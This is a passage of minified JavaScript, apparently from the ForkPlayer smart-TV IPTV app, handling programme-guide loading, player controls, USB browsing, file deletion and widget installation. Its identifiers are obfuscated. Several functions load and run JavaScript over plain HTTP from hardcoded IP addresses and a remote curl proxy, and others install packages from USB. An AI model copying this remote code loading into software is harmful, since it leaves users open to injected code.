event.returnValue=!1;return!1}
function trpt(){if(vPlayer.l11III0l1u1FMO10OYpr)vPlayer.l0Ol1NZIl1l11Ypr()}
function flastView(m){vPlayer.lastPlayElement&&setSelect(vPlayer.lastPlayElement.index)&&vPlayer.lIOI1Iljvp11I0Ypr(vPlayer.lastPlayElement)}
function l0l0II11lpoPKl1l0Ypr(){vPlayer.l0l0II11lpoPKl1l0YprNext(-1)}
function l10IQI0OcGKI011Il11Ypr(){vPlayer.l0l0II11lpoPKl1l0YprNext(1)}
function getJserv(){if(JtvServ==null)return"85.17.30.79";else return JtvServ}
function objjoin(o,m){var r="";maJor.each(o,function(v,i){if(r!="")r+=m;r+=i});return r}
var errepg=0;var chorig="";function dt(sec,b,b2,b3,offc){sec=parseInt(sec);if(offc==null)sec+=(parseInt(maJor.params.get("JTVRegion"))+T.offset/60)*3600;var date=new Date(sec*1000);var hours="0"+date.getHours();var minutes="0"+date.getMinutes();var d="0"+date.getDate();var m="0"+(1+date.getMonth());if(b)s=d.substr(d.length-2)+'.'+m.substr(m.length-2);else s="";if(b3)s+="."+date.getFullYear();if(b2)ss2=':'+("0"+(sec%60)).substr(("0"+(sec%60)).length-2);else ss2="";return s+" "+hours.substr(hours.length-2)+':'+minutes.substr(minutes.length-2)+ss2}
var prog_timer;function pushNoEmpty(a,v){if(gV(v)!=="")a.push(v);return a}
var decodeEntities=(function(){var element=document.createElement('div');function decodeHTMLEntities(str){if(str&&typeof str==='string'){str=str.replace(/<script[^>]*>([\S\s]*?)<\/script>/gmi,'');str=str.replace(/<\/?\w(?:[^"'>]|"[^"]*"|'[^']*')*>/gmi,'');element.innerHTML=str;str=element.textContent;element.textContent=''}
return str}
return decodeHTMLEntities})();var fEpg={epg_ch:{},epg_ch_full:{},l001Q1O0II0CO01lYpr_last:0,epg_arr:{},llll1I1F0YlI00Ypr:function(ch,n){var c=this;var point=0;if(typeof JtvC=="undefined"){clearTimeout(fEpg.etst);fEpg.etst=setTimeout(function(){errepg++;if(errepg<7){l1OO1III0XvIvOlII1lYpr("http://85.17.30.89/common/jtv.js?vv=6");l1OO1III0XvIvOlII1lYpr("http://46.36.220.208/common/jtv.js?vv=6")}},1900);return""}
var tvgid=ch.jtvname||ch["tvg-id"];if(tvgid){if(JtvE[tvgid])return tvgid;for(j in JtvEF){if(JtvEF[j][tvgid])return tvgid}}
var t2=decodeEntities(ch.title);var t3=trim2(t2.toLowerCase());var t4=t3.replace(/ ?(hd|sd|\(.*?\))/g,"");var t5=t3.replace(/ (ru|ua|en|fr|tv)/g,"");var xm=(JtvE[ch.title]&&ch.title)||(JtvE[t2]&&t2)||JtvC[ch.title]||JtvC[t2]||JtvC[t3]||JtvC[t4]||JtvC[t5];return xm},jtvXML:function(ch,md){var c=this,r="";if(typeof JtvCFxmltv=="undefined"||typeof JtvEFxmltv=="undefined"){c.loadxmltv()}else if(md){var tvgid=ch.jtvname||ch["tvg-id"];if(tvgid&&gV(JtvEFxmltv[md],tvgid))r="xmltv-"+md+"-"+tvgid;else if(ch.title&&gV(JtvCFxmltv[md],ch.title))r="xmltv-"+md+"-"+JtvCFxmltv[md][ch.title]}
return r},add:function(page,t){var c=this;if(t){c.etst=setTimeout(function(){c.add(page)},t);return}
var xs={},xs2={},ttl="&ttl=",logo="&logo=";if(gV(page.global,"url_tvg"))var tvgmd=md5(page.global.url_tvg).substr(0,7);else tvgmd="";var ch=page.channels;maJor.each(ch,function(v,i){var cc=[],carr="";ch[i].logo_30x30=gV(v,"logo_30x30");if(!v.stream_url)return;cc=pushNoEmpty(cc,c.llll1I1F0YlI00Ypr(v));if(tvgmd)cc=pushNoEmpty(cc,c.jtvXML(v,tvgmd));cc=pushNoEmpty(cc,gV(c.epg_arr[page.lII1I1PVBuI1lIlYpr],v.title));if(cc.length){maJor.each(cc,function(val){carr=val;if(val.indexOf("xmltv-")==0)xs2[val]=1;else xs[val]=1;if(v.logo_30x30.indexOf("http")!=0){if(val.indexOf("xmltv-")==0){var xf=val.split("-");var chmd5=xf[1];var chid=xf.splice(2).join("-");ch[i].logo_30x30=(window.JtvIMxmltv&&gV(JtvIMxmltv[chmd5],chid))}else ch[i].logo_30x30="http://"+getJserv()+"/common/img/"+val+".png"}});ch[i].epg=cc.join(",")}
if(!v.logo_30x30)ch[i].logo_30x30=_img("_ST_1px.png");if(!v.yellow&&(v.catchup||v.catchup_days||gV(page.global,"catchup")||gV(page.global,"catchup_days"))){if(gV(v,"catchup_days")==="")ch[i].catchup_days=gV(page.global,"catchup_days")||3;ch[i].catchup_source=v.catchup_source||gV(page.global,"catchup_source");ch[i].catchup=v.catchup||gV(page.global,"catchup")||"default";if(v.catchup_days){var ac={"title":"_FPArchive_","playlist_url":gV(v,"stream_url")+"#archive|"+gV(v,"title")+"|"+carr+"|-"+v.catchup_days+"|"+v.catchup+"|"+v.catchup_source};ac.SetTimeInterval=ch.SetTimeInterval;page.channels[i].yellow=ac;if(v.menu)page.channels[i].menu.push(ac);else page.channels[i].menu=[ac]}}});var x=objjoin(xs,"-|-");var x2=objjoin(xs2,"-|-");if(x||x2){c.epg_last=0;if(x!="")c.epg_src="http://85.17.30.89/common/sip.php?do=apt&ver=2&type=xhr#POSTget="+x;else c.epg_src="";if(x2!="")c.epg_src2="http://exec4.remotecurl.spiderxml.com/curl/epg.php?ver=2&do=xmltv&type=xhr&cmd=epg&src="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(JtvSRC))+"#POSTget="+x2;else c.epg_src2="";c.load()}
if(!IlO11lQ0().isLoading)page.renderChannels(getSelect(),"update")},inPlayer:function(){var c=this;var e=vPlayer.playElement.epg;if(!is_rek&&gP().is_iptv>2&&e&&handler.match(/player|qual/)&&$_("chtitle")){var html="";$_("epg_full").style.display="block";if(e)var se=c.epg_ch_full[e]||c.epg_ch[e];if(se){var epG=c.parse({epg:se,tvgshift:vPlayer.playElement["tvg-shift"],from:c.epg_time,limit:2});html=epG.description;if(!is_arc){$_("remainingTime",getTimeFromMS(epG.curTime).substring(0,5));$_("totalTime"," / "+getTimeFromMS(epG.totalTime).substring(0,5));vPlayer.setPosition(Math.ceil((epG.curTime/epG.totalTime)*maJor.screen().w))}else if(!vPlayer.arc_timestamp){$_("totalTime","/"+dt(se["end"+nj])+"<img  height='18' src='"+_img("_ST_live.png")+"' />");vPlayer.getVideoPlayInfo()}}
$_("epg_full",html);$_("chtitle","<div id='progname' style='float:left;font-size:95%;overflow: hidden; width: 15%;'>"+curCh("title")+"</div>");if(!html){if(c.epg_ch_full[e])delete c.epg_ch_full[e];c.getfull(vPlayer.playElement)}}else $_("epg_full").style.display="none"},set_epg:function(n){var c=this;var ch=curCh();var data={"epg":1,"title":ch.title+"EPG","channels":[]};if(!n){c.epg_tl=ch.title;c.epg_tx=gP("lII1I1PVBuI1lIlYpr");data["chan"+"nels"]=[{"logo_30x30":"none","title":"_FPSteret_","playlist_url":"cmd:setEpg|-"+c.epg_tl+"|-"+c.epg_tx+"|-"}];data["chan"+"nels"].push({"logo_30x30":"none","playlist_url":"cmd:setEpgRegionmain","title":"iptvx.one"});for(j in JtvEF){data["chan"+"nels"].push({"logo_30x30":"none","playlist_url":"cmd:setEpgRegion"+j,"title":j.toUpperCase()})}}else if(n.indexOf("setEpgRegion")==0){var e=n.substr(12);if(e=="main")JtvArr=JtvE;else JtvArr=JtvEF[e];for(var i in JtvArr){data.channels.push({"logo_30x30":"http://"+getJserv()+"/common/img/"+i+".png","description":"EPG CODE: "+i,"jtvname":i,"title":(i.indexOf(".")>0)?JtvArr[i]+"."+i.split(".")[1]:JtvArr[i],"stream_url":"cmd:setEpg|-"+c.epg_tl+"|-"+c.epg_tx+"|-"+i+"|-"+n})}}else{var z=n.split("|-");if(!z[3])try{delete c.epg_arr[z[2]][z[1]]}catch(e){}else{if(!c.epg_arr[z[2]])c.epg_arr[z[2]]={};c.epg_arr[z[2]][z[1]]=z[3]}
maJor.write("epg_set",ll1lI1lI0sl0OlIYpr(c.epg_arr));setTimeout('kjtYpr.inf("'+z[1]+' уст. епг '+z[3]+'",1500);tmf();',150);return}
handler="menu";OpenUrl(data,gP("lII1I1PVBuI1lIlYpr")+"#epg")},getfull:function(ch){var c=this;ch=ch||curCh();if(T.inetTime-c.l001Q1O0II0CO01lYpr_last<1800000||!ch.epg)return;c.l001Q1O0II0CO01lYpr_last=T.inetTime;var tvgshift=(ch["tvg-shift"]||0)*3600;clearTimeout(prog_timer);var e=ch.epg;prog_timer=setTimeout(function(){if(handler.match(/menu|player|qual/)&&e&&c.epg_ch[e]&&!c.epg_ch_full[e]){if(e.indexOf("xmltv-")==0)var u="http://exec4.remotecurl.spiderxml.com/curl/epg.php?ver=2&do=xmltv&cmd=epg&src="+encodeURIComponent(ll1lI1lI0sl0OlIYpr(JtvSRC))+"&mode=full&get="+e;else u="http://85.17.30.89/common/sip.php?ver=2&do=full&get="+e;xhrt=new XMLHttpRequest();ch.description+="<center><img id='bloading' src='"+_img("_ST_b_loading.gif")+"' width=15 /></center>";$_("description",ch.description);uHelper.create("directnoheader").setMaxTime(45).hid().get(u).parse=function(s){if($_("bloading"))$_("bloading").style.display="none";var m=l0OIIlIIlONuu1111Ypr(s);if(m&&m[e]){c.epg_ch[e]=m[e];c.epg_ch_full[e]=m[e];if(e==ch.epg){var epG=fEpg.parse({epg:m[e],tvgshift:page.channels[i]["tvg-shift"]});ch.description=ch.title+"<br>"+epG.description+"<div style='position:absolute;top:0px;width:98%;font-size:60%;text-align:right;vertical-align:top;'><span style='color:rgb(197, 157, 157);vertical-align:top;'>"+ch.epg+"</style> <img align='right' width="+css_w(24)+" src='"+_img(ch.logo_30x30)+"' /></div>";if(handler!="vk")$_("description",ch.description)}}}}},5000)},parse:function(obj){var c=this;var res={"description":""},tvgshift=(obj["tvg-shift"]||0)*3600,nl=obj.limit||-1;maJor.each(obj.epg,function(v,start){start=parseInt(start)+tvgshift;var end=parseInt(v.end)+tvgshift;if(obj.from&&end<obj.from)return;if(end>c.epg_time&&start<=c.epg_time){var t=Math.ceil((end-c.epg_time)/60);if(t>=0)t="+"+t;res.curTime=c.epg_time-start;res.totalTime=end-start;res.epgnow={"title":v.title,"time":t,"cur":Math.ceil((res.curTime/res.totalTime)*100)};var bb="color:rgb(231, 110, 110);font-weight:bold"}else bb="color:rgb(197, 157, 157);";res.description+="<span style='"+bb+"'>"+dt(start)+" - "+dt(end)+"</span> "+v.title+"<br>";if(nl>=0){if(--nl==0)return!1}});return res},load:function(){var c=this;if(T.inetTime-c.epg_last<60000&&T.inetTime>0){return}
c.epg_last=T.inetTime;clearTimeout(c.epg_timer);c.load_src(c.epg_src);c.load_src(c.epg_src2)},load_src:function(u){var c=this;if(u){uHelper.create("directnoheader").setMaxTime(45).hid().get(u).parse=function(s){if(s==null){statusbar("Error get EPG "+u,"text")}else{var x=l0OIIlIIlONuu1111Ypr(s);if(x)c.jsc(x);else statusbar("Error format EPG "+s.substr(0,30),"text")}}}},jsc:function(obj,timer){var c=this;if(obj)for(var j in obj)c.epg_ch[j]=obj[j];if(!c.epg_ch)return;if(!timer)c.epg_timer=setTimeout(function(){c.epg_ch.now=parseInt(c.epg_ch.now)+60;c.jsc()},60000);page=Ill001()||gP();c.epg_time=c.epg_ch.now;for(var i=0;i<page.channels.length;i++){var e1=gV(page.channels[i],"epg").split(",");maJor.each(e1,function(e){if(e&&c.epg_ch[e]){if(c.epg_ch_full[e])c.epg_ch[e]=c.epg_ch_full[e];var epG=fEpg.parse({epg:c.epg_ch[e],tvgshift:page.channels[i]["tvg-shift"]});page.channels[i].description=page.channels[i].title+"<br>"+epG.description+"<div style='position:absolute;top:0px;width:98%;font-size:60%;text-align:right;vertical-align:top;'><span style='color:rgb(197, 157, 157);vertical-align:top;'>"+page.channels[i].epg+"</style> <img align='right' width=24 src='"+_img(page.channels[i].logo_30x30)+"' /></div>";page.channels[i].epgnow=epG.epgnow}})}
if(T.inetTime-c.epg_last>3600)c.load();page.epgAppend();IlO11lQ0().focused()},loadxmltv:function(u,cc){var c=this,x="exec4.remotecurl.spiderxml.com/curl";if(u!=null){if(typeof JtvCFxmltv!="undefined"&&JtvCFxmltv[md5(u).substring(0,7)])return;JtvCFxmltv={};JtvEFxmltv={};JtvIMxmltv={};JtvSRC={};var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src="http://"+x+"/epg.php?do=xmltv&ver=2&cmd=ch&u="+encodeURIComponent(u);statusbar(u,"link");script.onerror=script.onload=function(){statusbar("");clearTimeout(c.etst);c.add(cc);IlO11lQ0().focused()};document.getElementsByTagName('head')[0].appendChild(script)}},init:function(){var c=this;c.epg_arr=l0OIIlIIlONuu1111Ypr(maJor.read("epg_set"))||{};c.loadxmltv()}};function jsc_142427789(obj,timer){fEpg.jsc(obj,timer)}
function lI110OO11OlOQYpr(sec){m=Math.floor(sec/60);h=Math.floor(m/60);m=m%60;s=sec%60;if(m<10)m="0"+m;if(s<10)s="0"+s;return h+":"+m+":"+s}
function FsetFocus(idx){var ni=parseInt(cntIndex)+parseInt(idx);if(rowID==2){$_("progressBarClick").style.height="12px";$_("progressBall").style.display="block";if(idx!=0)vPlayer.frw(idx*60);else{resetFocus();$_("progressBall").className+=" progressBallHover";$_("progressBarStatus").className+=" progressBallHover"}}else{$_("progressBarClick").style.height="8px";$_("progressBall").style.display="none";for(var i in maJor.allPlayerButton){if(maJor.allPlayerButton[i].row[0]==ni&&maJor.allPlayerButton[i].row[1]==rowID){resetFocus();cntIndex=ni;if(rowID==3)$_(i).style.background="#ff0000";else $_(i).style.background="#aa2222";break}}}}
function selectedButton(){rowID=parseInt(rowID);cntIndex=parseInt(cntIndex);if(rowID==1&&cntIndex<2){}else if(rek_url)return;if(rowID==1){switch(cntIndex){case 0:vPlayer.pause();break;case 1:if(vPlayer.l11III0l1u1FMO10OYpr){vPlayer.l0Ol1NZIl1l11Ypr()}else vPlayer.play();break;case 2:vPlayer.frw(-1);break;case 3:vPlayer.frw(1);break;case 4:newOptions();break;case 5:flastView(!0);break;case 6:l0l0II11lpoPKl1l0Ypr();cntIndex=6;FsetFocus(0);break;case 7:l10IQI0OcGKI011Il11Ypr();cntIndex=7;FsetFocus(0);break}}else if(rowID==3){switch(cntIndex){case 0:vPlayer.minimizeplayer(!0);break;case 1:vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();break}}}
function resetFocus(){for(var i in maJor.allPlayerButton){$_(i).style.background=""};$_("progressBall").className="progressBall";$_("progressBarStatus").className="progressBarStatus"}
var xhrz;var xss="",alls="",wint_name="";function ScanUsbPort(c){var StoragePlugin=$_('pluginStorage');var nUSBCount=StoragePlugin.GetUSBListSize();var data={"playlist_name":"","channels":[]};if(nUSBCount>0){for(var i=0;i<nUSBCount;i++){var DeviceId=parseInt(StoragePlugin.GetUSBDeviceID(i));var MountPath=StoragePlugin.GetUSBMountPath(DeviceId,0);var usbPath='/dtv/usb/'+MountPath;text=StoragePlugin.GetUSBVendorName(DeviceId)+"<br>"+StoragePlugin.GetUSBModelName(DeviceId)+"<br>"+MountPath;data.channels.push({"title":StoragePlugin.GetUSBVendorName(DeviceId)+" ("+StoragePlugin.GetUSBModelName(DeviceId)+")","description":text,"playlist_url":"usb://"+usbPath})}}else kjtYpr.inf("_FPNoDevices_ USB",1500,"orange");data.channels.push({"title":"_FPTVmemory_","description":"_FPTVmemory_ ТВ","playlist_url":"usb:///mtd_rwcommon/common"});c.parse(ll1lI1lI0sl0OlIYpr(data))}
function usbDelete(usbPath){var FilePlugin=$_('pluginObjectFileSystem');if(FilePlugin.IsExistedPath(usbPath))FilePlugin.Delete(usbPath);else{kjtYpr.inf("_FPOshibka_ удаления! "+usbPath,1800);return}
if(FilePlugin.IsExistedPath(usbPath))kjtYpr.inf("_FPOshibka_!",1800);else kjtYpr.inf("_FPDeleted_! "+usbPath,1800)}
var Playlist=new RegExp("\.(m3u|xml|txt)$","i");var Wdg=new RegExp("\.zip$","i");function getUsbList(usbPath,c){usbPath=usbPath.replace("//","/").replace("//","/");var FilePlugin=$_('pluginObjectFileSystem');try{var leftspace="<font color='#EEE'>Свободно в ТВ:</font> "+ToSize(FilePlugin.GetTotalSize()-FilePlugin.GetUsedSize())}catch(e){}
if(Wdg.exec(usbPath)!=null){var name=usbPath.substr(usbPath.lastIndexOf("/")+1).replace(/.zip/i,"");if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuzheEstVustanovlennih_!",2000,"red")}else{setTimeout(function(){FilePlugin.Unzip(usbPath,'/mtd_rwcommon/widgets/user/'+name+'/');if(FilePlugin.IsExistedPath('/mtd_rwcommon/widgets/user/'+name+'/config.xml')){kjtYpr.inf("_FPVidget_ "+name+" _FPuspeshnoUstanovlen_!",2000,"green");kjtYpr.popUp("_FPViklIvklTVchtobiUv_ "+name+" _FPvSmHubVidgNaidDop_",6000);is_loadpage(0)}else{kjtYpr.inf("_FPOshibkaUstanovki_"+name+" !",2000,"orange")}},300)}
return}
var fileSystemObj=new FileSystem();var arrFiles=fileSystemObj.readDir(usbPath);var data={"channels":[]};if(arrFiles){if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);data.channels.push(emptyCh)}
for(var i=2;i<arrFiles.length;i++){if(arrFiles[i].isDir){data.channels.push({"title":arrFiles[i].name,"playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name})}}
for(var i=2;i<arrFiles.length;i++){if(!arrFiles[i].isDir){if(Playlist.exec(arrFiles[i].name)!=null)
data.channels.push({"title":arrFiles[i].name,"playlist_url":"xml://"+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)+"<br>"+"xml://"+usbPath+"/"+arrFiles[i].name});else if(Wdg.exec(arrFiles[i].name)!=null)
data.channels.push({"logo_30x30":"none","title":"<font color='#FFC600'>"+arrFiles[i].name+"</font>","playlist_url":"usb://"+usbPath+"/"+arrFiles[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+arrFiles[i].name+"<br><font color='#EEE'>_FPRazmer_:</font> "+ToSize(arrFiles[i].size)+"<br>"+leftspace+"<br><br>Внимание! Убедитесь что в архиве находится именно виджет для самсунг смарт тв и достаточно свободного места</span>"});else data.channels.push({"title":arrFiles[i].name,"stream_url":""+usbPath+"/"+arrFiles[i].name,"description":arrFiles[i].name+"<br>"+ToSize(arrFiles[i].size)})}}}else{if(arrFiles.length==2){kjtYpr.inf("_FPPustayaPapka_!",1000);c.parse(ll1lI1lI0sl0OlIYpr(emptyCh))}}
c.parse(ll1lI1lI0sl0OlIYpr(data))}
function TUsbList(dir,c){var data={"channels":[]};if(dir=="/"){tizen.filesystem.listStorages(function(r){for(var i=0;i<r.length;i++){data.channels.push({"title":r[i].label,"playlist_url":"usb:/"+dir+r[i].label,"description":"usb:/"+dir+r[i].label+"<br>"+r[i].type+"<br>"+r[i].state})}
c.parse(ll1lI1lI0sl0OlIYpr(data))},function(err){c.parse(JSON.stringify(err))})}else{if(dir.match(/\.wgt$/)){kjtYpr.popUp("Install package "+dir,1500);var onInstallation={onprogress:function(packageId,percentage){kjtYpr.popUp("On installation("+packageId+") : progress("+percentage+")",1000)},oncomplete:function(packageId){kjtYpr.popUp("Installation("+packageId+") Complete",1000)}}
var onError=function(err){kjtYpr.popUp("Error occurred on installation : "+JSON.stringify(err),1000);c.parse(JSON.stringify(err))}
tizen.filesystem.resolve(dir.substr(1),function(file){kjtYpr.popUp("file URI : "+file.toURI(),1500);try{tizen.package.install(file.toURI(),onInstallation,onError)}catch(e){kjtYpr.popUp("Er: "+e.message,1500);c.parse(ll1lI1lI0sl0OlIYpr(e))}},function(err){kjtYpr.popUp("Error occurred on resolve : "+JSON.stringify(err),1500);c.parse(ll1lI1lI0sl0OlIYpr(err))},"r");return}
var documentsDir;function onsuccess(files){try{for(var i=0;i<files.length;i++){if(!files[i].isFile){data.channels.push({"title":files[i].name,"playlist_url":"usb:/"+dir+"/"+files[i].name,"description":files[i].name})}}
for(var i=0;i<files.length;i++){if(files[i].isFile){if(Playlist.exec(files[i].name)!=null)
data.channels.push({"logo_30x30":_img('_ST_xmls.png'),"title":files[i].name,"playlist_url":"xml://"+files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"+"xml://"+files[i].fullPath});else if(files[i].name.match(/\.wgt$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"usb:/"+dir+"/"+files[i].name,"description":"<span style='color:red;'><font color='#EEE'>Установка виджета:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br><br>Внимание! Убедитесь что в архиве находится именно виджет для самсунг TIZEN смарт тв и достаточно свободного места</span>"});else if(files[i].name.match(/\.(htm|html)$/))
data.channels.push({"logo_30x30":"","title":"<font color='#FFC600'>"+files[i].name+"</font>","playlist_url":"html://"+files[i].fullPath,"description":"<span style='color:red;'><font color='#EEE'>Открыть html страницу:</font> "+files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br><br><br>Внимание! ForkPlayer будет закрыт!</span>"});else{data.channels.push({"title":files[i].name,"stream_url":files[i].fullPath,"description":files[i].name+"<br>"+files[i].modified+"<br>"+ToSize(files[i].fileSize)+"<br>"});if(is_img(files[i].fullPath)){data.channels[data.channels.length-1].logo_30x30=files[i].fullPath;data.channels[data.channels.length-1].description='<div id="poster" style="float:left;padding:4px;background-color:#EEEEEE;margin:0px 13px 1px 0px;"><img src="'+files[i].fullPath+'" style="width:180px;float:left;"></div>'+data.channels[data.channels.length-1].description}}}}
c.parse(ll1lI1lI0sl0OlIYpr(data))}catch(e){kjtYpr.popUp("ONS="+e.message,2000);c.parse()}}
function onerror(error){is_loadpage(0);c.parse()}
tizen.filesystem.resolve(dir.substr(1),function(dir2){documentsDir=dir2;dir2.listFiles(onsuccess,onerror)},function(e){is_loadpage(0);kjtYpr.popUp(e.message,2000);c.parse()},"r")}}
function ToSize(b){var a=(b>=1073741824)?(b/1073741824)["toFixed"](2)+" ГБ":(b>=1048576)?(b/1048576)["toFixed"](2)+" МБ":(b>=1024)?(b/1024)["toFixed"](2)+" КБ":(b>=0)?b+" Байт":(b<0)?(2+b/1073741824)["toFixed"](2)+" ГБ":"";return a}
function parse_urlk(uk){try{var parse_ur=/^(?:([A-Za-z]+):)?(\/{0,3})([0-9.\-A-Za-z]+)(?::(\d+))?(?:\/([^?#]*))?(?:\?([^#]*))?(?:#(.*))?$/;var result=parse_ur.exec(uk);return result}catch(e){return uk}}
function in_array(needle,haystack,strict){var found=!1,key,strict=!!strict;for(key in haystack){if((strict&&haystack[key]===needle)||(!strict&&haystack[key]==needle)){found=!0;break}}
return found}
function parseHtmlEnteties(str){return str.replace(/&#([0-9]{1,4});/gi,function(match,numStr){var num=parseInt(numStr,10);return String.fromCharCode(num)})}
function ip2long(ip){if(ip==null)ip="";var components;if(components=ip.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/)){var iplong=0;var power=1;for(var i=4;i>=1;i-=1){iplong+=power*parseInt(components[i]);power*=256}
return iplong}else return 0};function fixEvent(e){e=e||window.event;if(e.pageX==null&&e.clientX!=null){var html=document.documentElement
var body=document.body
e.pageX=e.clientX+(html&&html.scrollLeft||body&&body.scrollLeft||0)-(html.clientLeft||0)
e.pageY=e.clientY+(html&&html.scrollTop||body&&body.scrollTop||0)-(html.clientTop||0)}
if(!e.which&&e.button){e.which=e.button&1?1:(e.button&2?3:(e.button&4?2:0))}
return e}
function getPosition(e){var left=0
var top=0
while(e.offsetParent){left+=e.offsetLeft
top+=e.offsetTop
e=e.offsetParent}
left+=e.offsetLeft
top+=e.offsetTop
return{x:left,y:top}}
var xhr4,fastremote_timer;function fmod(x,y){var tmp;var tmp2;var p=0;var pY=0;var l=0.0;var l2=0.0;tmp=x.toExponential().match(/^.\.?(.*)e(.+)$/);p=parseInt(tmp[2],10)-(tmp[1]+'').length;tmp=y.toExponential().match(/^.\.?(.*)e(.+)$/);pY=parseInt(tmp[2],10)-(tmp[1]+'').length;if(pY>p){p=pY}
tmp2=(x%y);if(p<-100||p>20){l=Math.round(Math.log(tmp2)/Math.log(10));l2=Math.pow(10,l);return(tmp2/l2).toFixed(l-p)*l2}else{return parseFloat(tmp2.toFixed(-p))}}
var l1Q0011lOE10u1OQ1O1Ypr_param="";function sU(u,d){if(u=="")return d;if(d=="")return u;ur=u.split("#POST");dr=d.split("#POST");if(ur[0].indexOf("?")==-1)ur[0]+="?";else ur[0]+="&";ur[0]+=dr[0];if(ur.length>1||dr.length>1){ur[0]+="#POST"+gV(ur[1]);if(gV(ur[1])!=""&&gV(dr[1])!="")ur[0]+="&";ur[0]+=gV(dr[1])}
return ur[0]}
function lOlO1IRNIA1lOlYpr(url){if(url.indexOf("AddFavorite(")==0){var m=url.match(/AddFavorite\((.*?)\)/)[1];if(m=="")url=gP().lII1I1PVBuI1lIlYpr;else url=m.split(",")[2]}
if((maJor.read("glstart")+maJor.read("zakladki.xml")+maJor.read("zakladkiSerials.xml")+maJor.read("zakladkiFilms.xml")+maJor.read("zakladkiIPTV.xml")+maJor.read("bookmarks")).indexOf(url)>=0)
return 1;return 0}
function l11IOOMMvt011llOYpr(url){if(typeof url=="object"){var se=getVars("start").search;for(var i in se.sites){if(url.url==se.sites[i].url)return i;else if(url.logo&&url.title&&url.logo==se.sites[i].logo&&url.title==se.sites[i].title)return i}
return-1}
if(url.indexOf("AddSearch(")==0){var m=url.match(/AddSearch\((.*?)\)/);if(m!=null){url=m[1].split(",")[2]}}
var se=getVars("start").search;for(var i in se.sites){if(url==se.sites[i].url)return i}
return-1}
function getDefaultSE(){var se=getVars("getconfig").search.sites;var d={},ds=-1,max=-1,titles=[];for(var i=0;i<se.length;i++){if(se[i].dop){titles.push(se[i].title)}
if(se[i].dop>max){max=se[i].dop;ds=i}}
if(ds>=0&&typeof se[ds]!="undefined")d=se[ds];d.allse=titles;return d}
var ico_edit='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABcAAAAXCAYAAADgKtSgAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAAZdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjAuMTnU1rJkAAAAhklEQVRIS+3UYQqAIAwFYG/XEbr/RVo+auJyMqdZBD14aTI/+lUgomk9HhPyGRyIgGo4D9Z6TX6W9hq+nWtrcJmLJEzDxYuRfBZ7CQ3g17niXi9uwkgP3gQjXrwZRkZwbU5CHThXi4ScuJUfV/MuvsR6f14cE0fWWBx6WnxQDb8lz+BzSmEH2u1KYK1g5m8AAAAASUVORK5CYII=';function is_ifr(ch){if(IlO11lQ0()==null){confirmed.create("Не ждать загрузку данных и открыть стартовую вкладку? Ранее открытые вкладки будут закрыты, настройки будут перезаписаны если их изменить.").fun0=function(){if($_("startlogo")!=null)$_("startlogo").style.display="none";$_("main").style.color=maJor.params.get("color");oInset.push(OeInit(Inset));oInset.renderInset();insetCount=oInset.tabs.length;gotoStart()}}else return IlO11lQ0().is_ifr(ch)}
function getNavU(u){if(gV(u)=="")return"";else if(u.indexOf("curl ")==0){var m=parseCURL(u);u=m.url}
if(u.indexOf("#POST")>0)u=u.split("#POST")[0];if(u.match(/^searchEngines(#url|xml)?\|/))u=u.split("|")[2];return u}
function breakScreen(u){$_("navigate",'<span id="navinfo2" style="color: #a9abac;font-size: 18px; padding: 5px;display:none;">'+gV($_("navinfo2"),"innerHTML")+'</span>'+"<span id='navurl' style='font-weight: bold;padding-left: 5px;overflow:hidden;'>"+getNavU(u)+"</span>");$_("description","");$_("content","");sethash()}
function setVars(f,n){if(f=="search"){var nn=getVars("start");nn.search=n;f="start";n=nn}
if(f=="start"){var ke=["before","br","id"];for(var i in n.fav){if(n.fav[i]==null)delete n.fav[i];else{for(var j in ke){if(typeof n.fav[i][ke[j]]!="undefined")delete n.fav[i][ke[j]]}}}
var np={"config":n.config,"fav":n.fav,"search":n.search};if(typeof n.hidetop!="undefined")np.hidetop=n.hidetop;maJor.write("glstart",ll1lI1lI0sl0OlIYpr(np))}}
function delDupl(ch1,ch2){var ex="|";for(i=0;i<ch1.length;i++)ex+=gV(ch1[i],"playlist_url")+""+gV(ch1[i],"stream_url")+"|";for(i=0;i<ch2.length;i++){if(ex.indexOf("|"+gV(ch2[i],"playlist_url")+""+gV(ch2[i],"stream_url")+"|")>=0){ch2.splice(i,1);i--}else{ex+=gV(ch2[i],"playlist_url")+gV(ch2[i],"stream_url")+"|"}}
return ch2}
function getTop(ch){var tmp={},ctop=[];for(var i in userTop){var z=""+userTop[i].c;while(z.length<10)z="0"+z;var k=z+gV(userTop[i],"tp")+i;tmp[k]={"playlist_url":i};for(var j in userTop[i])tmp[k][j]=userTop[i][j]}
function ksort(obj){var keys=[],sortedObj={};for(k in obj){if(obj.hasOwnProperty(k)){keys.push(k)}}
keys.sort();len=keys.length;for(i=len-1;i>=0;i--){sortedObj[keys[i]]=obj[keys[i]]}
return sortedObj}
tmp=ksort(tmp);var nx=0,fe="";for(var i in tmp){fe=tmp[i].playlist_url;if(tmp[i].c>5)ctop.push({"source":"usertop","c":tmp[i].c,"title":tmp[i].title,"description":""+getInfoUrl(tmp[i].playlist_url),"logo_30x30":tmp[i].logo_30x30,"playlist_url":tmp[i].playlist_url,"parser":tmp[i].parser});if(nx++>100){delete userTop[fe]}}
